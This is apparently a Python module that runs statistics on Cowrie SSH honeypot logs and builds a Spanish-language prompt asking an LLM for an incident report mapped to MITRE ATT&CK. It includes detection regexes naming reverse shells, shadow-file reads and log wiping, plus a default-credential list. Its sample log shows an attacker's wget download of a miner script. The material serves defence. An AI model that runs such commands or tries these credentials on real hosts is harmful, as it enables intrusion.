"""
==============================================================================
Cowrie Honeypot — Prompt Engineering Module  (h4cker/prompt_engineering.md)
==============================================================================
Técnicas aplicadas:
  1. Role Prompting       — Persona SOC-3 con especialidad exacta
  2. Few-Shot Examples    — 1 ejemplo completo muestra el formato esperado
  3. Chain-of-Thought     — 6 pasos de razonamiento explícito
  4. MITRE ATT&CK         — Mapeo automático de comandos a técnicas T1xxx
  5. Dynamic Injection    — Pre-análisis estadístico inyectado en el prompt
  6. Structured Output    — Secciones con delimitadores fijos para parseo

Referencia de técnicas:
  https://github.com/The-Art-of-Hacking/h4cker/blob/master/ai-research/prompt_engineering.md
==============================================================================
"""

import re
from collections import Counter
from datetime import datetime, timezone

# ─── Taxonomía MITRE ATT&CK para honeypots SSH ───────────────────────────────
# Fuente: https://attack.mitre.org/ → categorías relevantes a SSH/initial access

MITRE_MAP = [
    # (patrón regex en comando, técnica_id, nombre, descripción)
    (r"\bwget\b|\bcurl\b|\bfetch\b",         "T1105",     "Ingress Tool Transfer",      "descarga de herramientas/payloads remotos"),
    (r"\bxmri[g]?\b|\bmine[r]?\b|\bmonero\b|\bcrypto\b|\bcpuminer\b|\bminerd\b",
                                              "T1496",     "Resource Hijacking",         "minería de criptomonedas"),
    (r"\bcat\s+/etc/passwd\b|\bcat\s+/etc/shadow\b|\bunshadow\b",
                                              "T1003",     "OS Credential Dumping",      "lectura de archivos de contraseñas"),
    (r"\bchmod\b|\bchown\b|\bsetuid\b",       "T1548",     "Abuse Elevation Control",    "elevación de privilegios"),
    (r"\bsetuid\b|\bsudo\b|\bsu\s+-\b",       "T1548.001", "Setuid/Setgid",              "uso de bits SUID/SGID"),
    (r"\bnmap\b|\bmasscan\b|\bzmap\b",        "T1046",     "Network Service Discovery",  "escaneo de puertos en la red"),
    (r"\bps\s+aux\b|\bps\s+-ef\b|\btop\b|\bhtop\b",
                                              "T1057",     "Process Discovery",          "enumeración de procesos en ejecución"),
    (r"\buname\b|\bhostname\b|\bcat\s+/etc/issue\b|\bcat\s+/proc/version\b",
                                              "T1082",     "System Information Discovery","recopilación de info del sistema"),
    (r"\bls\s+[\-/]|\bfind\s+/\b|\bfind\s+\.\b",
                                              "T1083",     "File & Directory Discovery", "exploración del sistema de archivos"),
    (r"\bnetstat\b|\bss\s+-\b|\bip\s+addr\b|\bifconfig\b",
                                              "T1049",     "System Network Connections", "enumeración de conexiones de red"),
    (r"\bhistory\s+-c\b|\brm\s+-rf\s+/var/log\b|\becho\s+>\s+.*log\b|\bshred\b",
                                              "T1070",     "Indicator Removal",          "borrado de logs o historial"),
    (r"\bcrontab\b|\becho.*cron\b|\bcat.*crontab\b",
                                              "T1053.003", "Scheduled Task/Cron",        "persistencia via cron"),
    (r"\buseradd\b|\badduser\b|\bpasswd\b",   "T1136",     "Create Account",             "creación de cuentas adicionales"),
    (r"\bcat\s+>>?\s+.*authorized_keys\b|\bssh-keygen\b",
                                              "T1098.004", "SSH Authorized Keys",        "persistencia via SSH keys"),
    (r"\biptables\b|\bufw\b|\bfirewall\b",    "T1562.004", "Disable/Modify Firewall",    "modificación del firewall"),
    (r"\bbase64\b|\beval\b|\bpython.*decode\b|\bperl.*decode\b",
                                              "T1027",     "Obfuscated Files/Info",      "ofuscación de comandos o payloads"),
    (r"\bsystemctl\b|\bservice\b.*stop|\bkillall\b",
                                              "T1489",     "Service Stop",               "detención de servicios de seguridad"),
    (r"\bchpasswd\b|\bpasswd\s+root\b",       "T1098",     "Account Manipulation",       "cambio de contraseñas de cuentas"),
    (r"\b/bin/sh\b|\b/bin/bash\b|\bbash\s+-i\b|\bnc\s+.*-e\b",
                                              "T1059.004", "Unix Shell",                 "ejecución de shell o reverse shell"),
    (r"\bpython[23]?\s+-c\b|\bperl\s+-e\b|\bruby\s+-e\b",
                                              "T1059.006", "Python/Script Execution",    "ejecución de scripts de interpretación"),
]

# Credenciales por defecto conocidas (dispositivos IoT, routers, etc.)
DEFAULT_CREDS = {
    ("root", "root"), ("root", "toor"), ("root", ""), ("root", "admin"),
    ("root", "password"), ("root", "pass"), ("root", "123456"),
    ("admin", "admin"), ("admin", "password"), ("admin", ""), ("admin", "1234"),
    ("admin", "admin123"), ("administrator", "admin"),
    ("pi", "raspberry"), ("ubuntu", "ubuntu"), ("user", "user"),
    ("test", "test"), ("guest", "guest"), ("support", "support"),
    ("oracle", "oracle"), ("postgres", "postgres"), ("mysql", "mysql"),
    ("ftpuser", "ftpuser"), ("nagios", "nagios"), ("jenkins", "jenkins"),
    ("git", "git"), ("gitlab", "gitlab"), ("ansible", "ansible"),
}

# Contraseñas más comunes del mundo (HIBP top 100)
COMMON_PASSWORDS = {
    "123456", "password", "123456789", "12345678", "12345", "1234567",
    "qwerty", "abc123", "111111", "123123", "password1", "1234567890",
    "letmein", "monkey", "1234", "dragon", "master", "sunshine",
    "welcome", "shadow", "superman", "michael", "football", "login",
    "admin", "root", "pass", "test", "123", "qwerty123",
}


# ─── Funciones de pre-análisis ────────────────────────────────────────────────

def analyze_timing(events: list[dict]) -> dict:
    """
    Calcula el ritmo de ataque: intervalos entre intentos de login por IP.
    Un bot moderno ataca cada <2s. Un humano raramente va más rápido de 10s.
    """
    login_events = [
        e for e in events
        if e.get("eventid") in ("cowrie.login.failed", "cowrie.login.success")
        and e.get("timestamp")
    ]

    if len(login_events) < 2:
        return {"min_interval_s": None, "avg_interval_s": None, "classification": "insuficiente"}

    # Parsear timestamps y ordenar
    ts_list = []
    for e in login_events:
        try:
            raw = e["timestamp"].replace("Z", "+00:00")
            ts_list.append(datetime.fromisoformat(raw).timestamp())
        except ValueError:
            continue

    ts_list.sort()
    intervals = [round(b - a, 2) for a, b in zip(ts_list, ts_list[1:]) if b - a >= 0]

    if not intervals:
        return {"min_interval_s": None, "avg_interval_s": None, "classification": "indeterminado"}

    avg = round(sum(intervals) / len(intervals), 2)
    minimum = round(min(intervals), 2)

    if avg < 2:
        classification = "🤖 Bot ultra-rápido (automatizado)"
    elif avg < 10:
        classification = "🤖 Bot moderado (automatizado)"
    elif avg < 60:
        classification = "⚠ Semi-automatizado o script manual"
    else:
        classification = "👤 Posiblemente manual (humano)"

    return {
        "min_interval_s": minimum,
        "avg_interval_s": avg,
        "total_login_attempts": len(login_events),
        "classification": classification,
    }


def classify_credentials(events: list[dict]) -> dict:
    """
    Analiza el patrón de credenciales usadas y las clasifica.
    Retorna estadísticas + tipo de ataque más probable.
    """
    login_events = [
        e for e in events
        if e.get("eventid") in ("cowrie.login.failed", "cowrie.login.success")
        and e.get("username")
    ]
    if not login_events:
        return {"type": "sin_datos", "details": ""}

    cred_pairs  = [(e.get("username", ""), e.get("password", "")) for e in login_events]
    unique_creds = len(set(cred_pairs))
    total        = len(cred_pairs)
    usernames    = [u for u, _ in cred_pairs]
    passwords    = [p for _, p in cred_pairs]

    # Verificar credenciales por defecto
    default_hits = [(u, p) for u, p in cred_pairs if (u.lower(), p.lower()) in DEFAULT_CREDS]
    common_hits  = [(u, p) for u, p in cred_pairs if p.lower() in COMMON_PASSWORDS]

    top_users = Counter(usernames).most_common(5)
    top_pass  = Counter(passwords).most_common(5)

    # Clasificación del tipo de ataque
    if len(default_hits) >= 3:
        attack_type = "🎯 DICCIONARIO DE DEFAULTS — credenciales por defecto de dispositivos"
    elif unique_creds > 20 and total > 30:
        attack_type = "📚 DICCIONARIO MASIVO — ataque de fuerza bruta con wordlist grande"
    elif unique_creds > 5:
        attack_type = "📋 DICCIONARIO ESTÁNDAR — lista de contraseñas comunes"
    elif unique_creds <= 3 and len(set(usernames)) == 1:
        attack_type = "🎯 ATAQUE DIRIGIDO — pocas credenciales, usuario específico"
    else:
        attack_type = "🔄 ATAQUE MIXTO — combinación de estrategias"

    return {
        "type":          attack_type,
        "total_attempts": total,
        "unique_creds":  unique_creds,
        "default_creds_found": len(default_hits),
        "common_password_hits": len(common_hits),
        "top_usernames": [f"{u}({c})" for u, c in top_users],
        "top_passwords": [f"{p}({c})" for p, c in top_pass],
        "sample_defaults": list({f"{u}/{p}" for u, p in default_hits})[:5],
    }


def map_mitre_techniques(events: list[dict]) -> list[dict]:
    """
    Mapea comandos capturados a técnicas MITRE ATT&CK.
    Retorna lista ordenada de técnicas detectadas con evidencia.
    """
    commands = [
        e.get("input", "")
        for e in events
        if e.get("eventid") == "cowrie.command.input" and e.get("input")
    ]

    # Siempre incluir T1110 si hay intentos de login
    login_attempts = sum(
        1 for e in events
        if e.get("eventid") in ("cowrie.login.failed", "cowrie.login.success")
    )
    detected = []
    seen_ids = set()

    if login_attempts > 0:
        detected.append({
            "id":    "T1110.001",
            "name":  "Brute Force: Password Guessing",
            "desc":  "fuerza bruta por contraseña vía SSH",
            "evidence": f"{login_attempts} intentos de autenticación",
        })
        seen_ids.add("T1110.001")

    # T1021.004 — Remote Services: SSH (siempre aplica para Cowrie)
    if any(e.get("eventid") == "cowrie.session.connect" for e in events):
        detected.append({
            "id":   "T1021.004",
            "name": "Remote Services: SSH",
            "desc": "acceso remoto mediante SSH",
            "evidence": "conexión SSH registrada en el honeypot",
        })
        seen_ids.add("T1021.004")

    # Buscar técnicas en los comandos capturados
    for pattern, technique_id, name, desc in MITRE_MAP:
        if technique_id in seen_ids:
            continue
        matching_cmds = [
            cmd for cmd in commands
            if re.search(pattern, cmd, re.IGNORECASE)
        ]
        if matching_cmds:
            detected.append({
                "id":       technique_id,
                "name":     name,
                "desc":     desc,
                "evidence": matching_cmds[0][:80],  # primer comando que coincide
            })
            seen_ids.add(technique_id)

    return detected


def pre_analyze(events: list[dict]) -> dict:
    """Lanza los tres análisis y devuelve un dict consolidado."""
    return {
        "timing":       analyze_timing(events),
        "credentials":  classify_credentials(events),
        "mitre":        map_mitre_techniques(events),
        "unique_ips":   list({e.get("src_ip") for e in events if e.get("src_ip")}),
        "success_logins": [
            e for e in events if e.get("eventid") == "cowrie.login.success"
        ],
        "commands": [
            e.get("input", "") for e in events
            if e.get("eventid") == "cowrie.command.input" and e.get("input")
        ],
    }


# ─── Ejemplar Few-Shot (muestra el formato exacto de respuesta) ───────────────

FEW_SHOT_EXAMPLE = """
╔══════════════════════════════════════════════════════════════════════╗
║  EJEMPLO DE ANÁLISIS — Formato esperado de tu respuesta             ║
╠══════════════════════════════════════════════════════════════════════╣
║ REGISTROS DE ENTRADA (ejemplo):                                      ║
║ [2024-03-15 02:11:01] LOGIN FALLIDO | IP: 185.220.101.5 | root/root ║
║ [2024-03-15 02:11:02] LOGIN FALLIDO | IP: 185.220.101.5 | pi/raspberry║
║ [2024-03-15 02:11:03] LOGIN EXITOSO | IP: 185.220.101.5 | pi/raspberry║
║ [2024-03-15 02:11:04] COMANDO       | IP: 185.220.101.5 | whoami    ║
║ [2024-03-15 02:11:05] COMANDO       | IP: 185.220.101.5 | wget http://203.0.113.99/miner.sh ║
╠══════════════════════════════════════════════════════════════════════╣
║ ANÁLISIS ESPERADO:                                                   ║
║                                                                      ║
║ ## 1. CLASIFICACIÓN DEL ATAQUE                                       ║
║ 🤖 Bot automatizado — intervalo constante de 1s entre intentos.      ║
║ Patrón: diccionario de credenciales IoT/Raspberry Pi.                ║
║                                                                      ║
║ ## 2. ANÁLISIS DE CREDENCIALES                                       ║
║ Tipo: Diccionario de defaults. Probó root/root → pi/raspberry.       ║
║ Éxito con credencial por defecto de Raspberry Pi.                    ║
║                                                                      ║
║ ## 3. MAPEO MITRE ATT&CK                                             ║
║ ▸ T1110.001 — Password Guessing: 2 intentos de login                 ║
║ ▸ T1021.004 — Remote Services SSH: acceso confirmado                 ║
║ ▸ T1082     — System Info Discovery: comando whoami                  ║
║ ▸ T1105     — Ingress Tool Transfer: wget de binario externo         ║
║ ▸ T1496     — Resource Hijacking: nombre "miner.sh" → minería        ║
║                                                                      ║
║ ## 4. INDICADORES DE COMPROMISO (IoC)                                ║
║ • IP atacante: 185.220.101.5                                         ║
║ • URL maliciosa: http://203.0.113.99/miner.sh                        ║
║ • Credencial comprometida: pi/raspberry (default Raspberry Pi)       ║
║                                                                      ║
║ ## 5. NIVEL DE RIESGO                                                ║
║ 🔴 CRÍTICO — Login exitoso + descarga de crypto miner confirmados.   ║
║                                                                      ║
║ ## 6. RECOMENDACIONES                                                ║
║ 1. Bloquear 185.220.101.5 en el firewall de forma inmediata.         ║
║ 2. Cambiar credenciales SSH; deshabilitar autenticación por password. ║
║ 3. Auditar procesos activos en el sistema (buscar xmrig/minerd).     ║
╚══════════════════════════════════════════════════════════════════════╝
""".strip()


# ─── Builder del prompt principal ─────────────────────────────────────────────

def build_prompt(
    events_text:   str,
    pre_analysis:  dict,
    rag_context:   str = "",
) -> str:
    """
    Construye el prompt completo usando todas las técnicas avanzadas.
    
    Args:
        events_text:   Logs formateados (una línea por evento)
        pre_analysis:  Resultado de pre_analyze()
        rag_context:   Contexto histórico RAG (puede ser vacío)
    
    Returns:
        Prompt string listo para enviar a Ollama
    """
    timing  = pre_analysis.get("timing", {})
    creds   = pre_analysis.get("credentials", {})
    mitre   = pre_analysis.get("mitre", [])
    ips     = pre_analysis.get("unique_ips", [])
    success = pre_analysis.get("success_logins", [])
    cmds    = pre_analysis.get("commands", [])

    # ── Bloque de estadísticas pre-calculadas ─────────────────────────────
    timing_str = ""
    if timing.get("avg_interval_s") is not None:
        timing_str = (
            f"  • Intervalo promedio entre intentos: {timing['avg_interval_s']}s\n"
            f"  • Intervalo mínimo: {timing['min_interval_s']}s\n"
            f"  • Clasificación automática: {timing['classification']}"
        )
    else:
        timing_str = "  • Evento único o datos de timing insuficientes"

    creds_str = (
        f"  • Tipo de ataque detectado: {creds.get('type', 'N/A')}\n"
        f"  • Total intentos: {creds.get('total_attempts', 0)} | Credenciales únicas: {creds.get('unique_creds', 0)}\n"
        f"  • Credenciales por defecto encontradas: {creds.get('default_creds_found', 0)}\n"
        f"  • Top usuarios: {', '.join(creds.get('top_usernames', ['—']))}\n"
        f"  • Top contraseñas: {', '.join(creds.get('top_passwords', ['—']))}"
    )
    if creds.get("sample_defaults"):
        creds_str += f"\n  • Defaults detectados: {', '.join(creds['sample_defaults'])}"

    mitre_str = ""
    if mitre:
        mitre_str = "  Técnicas detectadas automáticamente:\n"
        for t in mitre:
            mitre_str += f"  ▸ {t['id']} — {t['name']}: {t['evidence']}\n"
    else:
        mitre_str = "  • Sin comandos capturados que mapeen a MITRE"

    success_str = ""
    if success:
        success_str = "\n  ⚠ LOGINS EXITOSOS CONFIRMADOS:\n"
        for e in success[:5]:
            success_str += f"  • {e.get('src_ip')} → {e.get('username')}/{e.get('password')}\n"

    rag_block = f"\n{rag_context}\n" if rag_context else ""

    # ── Prompt completo ────────────────────────────────────────────────────
    prompt = f"""Eres un analista de ciberseguridad de nivel SOC-3 con 10 años de experiencia en \
Threat Intelligence, Incident Response y análisis de honeypots SSH. \
Conoces el framework MITRE ATT&CK de memoria y produces informes claros y accionables.

{FEW_SHOT_EXAMPLE}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

ANÁLISIS PRE-PROCESADO (usa estos datos como base, no los recalcules):

[TIMING DEL ATAQUE]
{timing_str}

[CREDENCIALES]
{creds_str}{success_str}
[MITRE ATT&CK — Auto-detectado]
{mitre_str}

[IPs INVOLUCRADAS]: {', '.join(ips) if ips else '—'}
[COMANDOS CAPTURADOS]: {len(cmds)} comandos
{rag_block}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

REGISTROS COMPLETOS DEL HONEYPOT:
{events_text}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Basándote en los registros Y el análisis pre-procesado, genera un informe con EXACTAMENTE \
estos 6 bloques (copia los títulos exactos):

## 1. CLASIFICACIÓN DEL ATAQUE
[Confirma o ajusta la clasificación automática. Máximo 2 líneas.]

## 2. ANÁLISIS DE CREDENCIALES
[Describe el patrón. ¿Es diccionario estándar, defaults IoT, ataque dirigido? \
¿Qué credencial tuvo éxito si aplica?]

## 3. MAPEO MITRE ATT&CK
[Usa la lista pre-detectada como base. Añade o elimina técnicas si hay evidencia extra. \
Formato: ▸ T1xxx — Nombre: evidencia concreta]

## 4. INDICADORES DE COMPROMISO (IoC)
[Lista: IPs, URLs, hashes si aplica, credenciales comprometidas, patrones sospechosos]

## 5. NIVEL DE RIESGO
[Una sola línea: 🔴 CRÍTICO / 🟠 ALTO / 🟡 MEDIO / 🟢 BAJO — con justificación en 15 palabras máx]

## 6. RECOMENDACIONES
[Exactamente 3 acciones. Numeradas. Concretas e inmediatas. Máximo 1 línea cada una.]

REGLAS ESTRICTAS:
- Responde ÚNICAMENTE en español
- No repitas los datos de entrada literalmente
- No escribas nada fuera de los 6 bloques
- Sé directo y profesional; cero relleno
"""
    return prompt
